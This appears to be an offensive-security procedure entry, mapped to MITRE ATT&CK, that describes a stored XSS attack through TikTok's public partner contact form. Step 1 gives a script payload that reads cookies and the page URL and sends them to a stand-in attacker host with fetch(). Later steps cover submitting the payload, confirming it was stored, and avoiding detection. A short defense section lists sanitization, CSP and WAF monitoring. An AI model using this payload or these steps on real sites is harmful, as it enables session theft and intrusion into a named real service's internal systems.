---
id: proc-tiktok-xss-inject-1
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.338Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Stored-XSS-Payload-via-Public-Contact-Form

## Summary

This procedure involves submitting a malicious JavaScript payload through TikTok's publicly accessible partner application contact form, exploiting the lack of input sanitization to store the payload in the backend for later execution.

## Description

The attack targets the contact form used by influencers and agencies, where external input is accepted without proper filtering. The payload is injected into form fields (e.g., message body) and stored server-side, eventually propagating to internal systems like Dorado/DataLeap. This sets the stage for execution in a privileged context, leading to data theft. Prerequisites include public access to the form and basic JavaScript knowledge for payload crafting.

## Requirements

1. Public internet access to the TikTok partner application.
2. A web browser for form submission and payload testing.
3. An external server to receive exfiltrated data (e.g., for payload callbacks).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization on all form submissions using libraries like DOMPurify.
- Deploy Content Security Policy (CSP) to restrict script execution.
- Monitor for anomalous form submissions with script tags via WAF rules.

## Objectives

1. Successfully store malicious JavaScript in the backend without rejection.
2. Ensure payload persistence for administrative review.
3. Avoid detection during injection phase.

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Design a JavaScript payload that executes upon rendering, capturing data like cookies and sending it to an attacker-controlled endpoint.

Example payload: `<script>var data = document.cookie + location.href; fetch('https://attacker.com/exfil?data=' + encodeURIComponent(data));</script>`

> Embed this in the form's message field to test storage.

### Step 2: Submit the Form

**Context**: Access the public contact form and inject the payload into an unsanitized field.

Navigate to the partner application form URL and fill out required fields, placing the payload in the comments or description area. Submit the form.

> Expected output: Confirmation of submission; no errors indicating sanitization.

### Step 3: Verify Storage (Optional)

**Context**: If possible, attempt to view the submission publicly or monitor backend responses for storage confirmation.

Use browser developer tools to inspect network requests during submission.

> Look for successful POST response without payload stripping.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
